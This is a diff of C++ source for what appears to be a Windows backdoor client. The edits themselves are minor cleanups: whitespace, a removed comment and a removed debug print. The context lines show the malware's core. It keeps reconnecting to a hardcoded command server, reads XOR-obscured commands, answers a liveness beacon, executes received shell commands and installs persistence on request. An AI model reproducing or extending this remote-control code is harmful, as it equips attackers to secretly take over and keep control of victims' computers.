@@ -36,7 +36,7 @@ int Connexion::openConnexion()
     address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
     address_client.sin_family = AF_INET;
     address_client.sin_port = htons(PORT);
-    
+
     while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
     {   
         Sleep(TIMEOUT_SOCK_RECONNECT);
@@ -61,7 +61,7 @@ int Connexion::main()
         //Sleep(1000);
 
         command = recvSafe(); //Recv safe and decrypt xor
-
+        
         if(command.find("is_life?") != string::npos)
         {
             ;
@@ -118,7 +118,7 @@ int Connexion::main()
                 Exec().executeCommand(command.substr(8));   
             }
 
-            else if (command.substr(0,16) =="MOD_PERSISTENCE:")   //A CHANGER !!!!!!
+            else if (command.substr(0,16) =="MOD_PERSISTENCE:")
             {
                 //In mod persistence.
                 Persistence persistence(a_is_admin, a_path_prog);
@@ -126,7 +126,6 @@ int Connexion::main()
 
                 if(command.substr(16) =="default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                 {
-                    cout << "Default persi" << endl;
                     send(sock_client , XOREncryption("\r\n").c_str() ,2 ,0);    
                 }
                 else
